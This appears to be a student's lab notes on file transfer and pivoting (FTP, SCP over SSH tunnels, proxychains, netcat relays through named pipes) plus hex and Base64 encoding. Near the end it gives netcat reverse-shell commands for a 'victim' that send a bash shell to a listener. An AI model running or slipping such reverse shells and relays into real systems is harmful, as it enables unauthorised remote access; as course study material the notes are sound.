@@ -1,0 +1,222 @@
+FTP
+active high port to high port client to server
+ftp <ip>
+	username and password
+	ls
+
+passive server to client
+ftp use wget
+  wget -r ftp://<ip>
+
+passive ftp
+  proxychains ftp <ip>
+    password and username
+  passive
+  ls
+SCP
+Who has the file
+and the target where you want to put the file
+SCP Options
+.  - Present working directory
+-v - verbose mode
+-P - alternate port (captial P for SCP) (higher priority P)
+	ssh uses lower case p
+-r - recursively copy an entire directory
+-3 - 3-way copy
+* - wildcard to grab everything
+SCP Syntax
+Download a file from a remote directory to a local directory
+$ scp student@172.16.82.106:secretstuff.txt /home/student
+Upload a file to a remote directory from a local directory
+$ scp secretstuff.txt student@172.16.82.106:/home/student
+Copy a file from a remote host to a separate remote host
+$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+password:    password:
+SCP Syntax
+Recursive upload of a folder to remote
+$ scp -r folder/ student@172.16.82.106:
+Recursive download of a folder from remote
+$ scp -r student@172.16.82.106:folder/ .
+SCP Syntax w/ alternate SSHD
+Download a file from a remote directory to a local directory
+$ scp -P 1111 student@172.16.82.106:secretstuff.txt .
+Upload a file to a remote directory from a local directory
+$ scp -P 1111 secretstuff.txt student@172.16.82.106:
+SCP Syntax through a tunnel
+Create a local port forward to target device
+$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+ 	(*** -NT locks out the terminal so you do not loose your tunnel)
+Download a file from a remote directory to a local directory
+$ scp -P 1111 student@localhost:secretstuff.txt /home/student
+Upload a file to a remote directory from a local directory
+$ scp -P 1111 secretstuff.txt student@localhost:/home/student
+SCP Syntax through a Dynamic Port forward
+Create a Dynamic Port Forward to target device
+$ ssh student@172.16.82.106 -D 9050 -NT
+Download a file from a remote directory to a local directory
+$ proxychains scp student@localhost:secretstuff.txt .
+Upload a file to a remote directory from a local directory
+$ proxychains scp secretstuff.txt student@localhost:
+local---------------------------.106-----------------------------------<private internal IP of target network>
+A--------------------------------B-------------------------------------------C
+
+Dynamic ssh from A to B
+			Now able to interact with C via proxy chain scp
+
+without the dynamic (-D option) a normal ssh would only be able to view and interact with box B
+Dynamic allows interactions beyond the directly connected(via ssh) box
+
+NETCAT
+NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
+    • Can be used for the following:
+        ◦ inbound and outbound connections, TCP/UDP, to or from any port
+        ◦ troubleshooting network connections
+        ◦ sending/receiving data (insecurely)
+        ◦ port scanning (similar to -sT in Nmap)
+NETCAT: Client to Listener file transfer
+    • Listener (receive file):
+nc -lvp 9001 > newfile.txt
+    • Client (sends file):
+nc 172.16.82.106 9001 < file.txt
+NETCAT: Listener to Client file transfer
+    • Listener (sends file):
+nc -lvp 9001 < file.txt
+    • Client (receive file):
+nc 172.16.82.106 9001 > newfile.txt
+NETCAT Relay Demos
+Listener - Listener
+    • On Blue_Host-1 Relay:
+$ mknod mypipe p
+$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+    • On Internet_Host (send):
+$ nc 172.16.82.106 1111 < secret.txt
+    • On Blue_Priv_Host-1 (receive):
+$ nc 192.168.1.1 3333 > newsecret.txt
+Listening Port must be made first then you can make a connection
+	set/open the listening port
+	then connect to it
+
+
+ssh student@10.50.38.176 -X
+student@blue-internet-host-student-19:~$ ssh student@172.16.82.106
+student@172.16.82.106's password: 
+Linux blue-host-1-student-19 4.19.0-18-cloud-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 22 14:32:11 2024 from 10.10.0.40
+student@blue-host-1-student-19:~$ mkfifo mypipe
+student@blue-host-1-student-19:~$ ls
+mypipe
+student@blue-host-1-student-19:~$ mknod mypipe2 p
+student@blue-host-1-student-19:~$ ls
+mypipe  mypipe2
+student@blue-host-1-student-19:~$ file mypipe
+mypipe: fifo (named pipe)
+student@blue-host-1-student-19:~$ file mypipe2
+mypipe2: fifo (named pipe)
+student@blue-host-1-student-19:~$ rm mypipe2
+student@blue-host-1-student-19:~$ ls
+mypipe
+student@blue-host-1-student-19:~$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+-bash: nc: command not found
+-bash: nc: command not found
+
+student@blue-host-1-student-19:~$ history
+    1  sudo tcpdump -vvXX 'tcp[0:2]=2025' -n 
+    2  exit
+    3  mkfifo mypipe
+    4  ls
+    5  mknod mypipe2 p
+    6  ls
+    7  file mypipe
+    8  file mypipe2
+    9  rm mypipe2
+   10  lsLA
+   11  nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+   12  whereis nc
+   13  history
+
+
+
+
+
+
+--------------------
+internet
+nc 172.3.82.106 1111 < README
+
+
+
+host 1
+ssh student@172.3.82.106
+nc -lvp 1111 | nc -lvp 3333
+	send this
+
+Priv host
+ssh 172.16.82.106
+ssh 192.168.1.10
+nc 192.168.1.1 3333
+	Recieved
+	Send this
+----------------------------------------
+
+nc ip 8888
+send*any message
+
+nc ip 9999 < mypipe | nc -lvp 8888 > mypipe
+	***used mypipe name pipe for relay
+
+nc -lvp 9999
+recieve*any message
+
+--------------------------------------------
+nc -lvp 7777
+
+nc ip 5555 < mypipr | nc iplocal 7777 > mypipe
+
+nc -lvp 5555
+
+
+Reverse Shells
+Reverse shell using NETCAT
+    • First listen for the shell on your device. 
+    • Open local listening port
+$ nc -lvp 9999
+    • On Victim using -c :
+    • run a command on the victim
+$ nc -c /bin/bash 10.10.0.40 9999
+    • On Victim using -e :
+    • run a command on the vitcim machine
+$ nc -e /bin/bash 10.10.0.40 9999
+nc -lvp 8888
+
+nc -lvp < mp | nc iplocal 8888 > mp
+
+nc -c binbash 192.168.1.1 9999
+
+
+
+Understanding Packing and Encoding
+    • Discuss the purpose of packers
+    • Perform Hexadecimal encoding and decoding
+    • Demonstrate Base64 encoding and decoding
+    • Conduct file transfers with Base64
+XXD decodes HexadecimalEncoding and Decoding
+    • Specialized formatting
+    • Used for transmission and storage
+    • Hex and Base64 are the most common
+    • NOT Compression
+    • NOT Encapsulation
+    • NOT Encryption
+xxd example
+    • echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\
+$ echo "Hex encoding test" | xxd -p
+48657820656e636f64696e6720746573740a
+    • echo hex string and use xxd to restore the data to its original format
+$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
+Hex encoding test
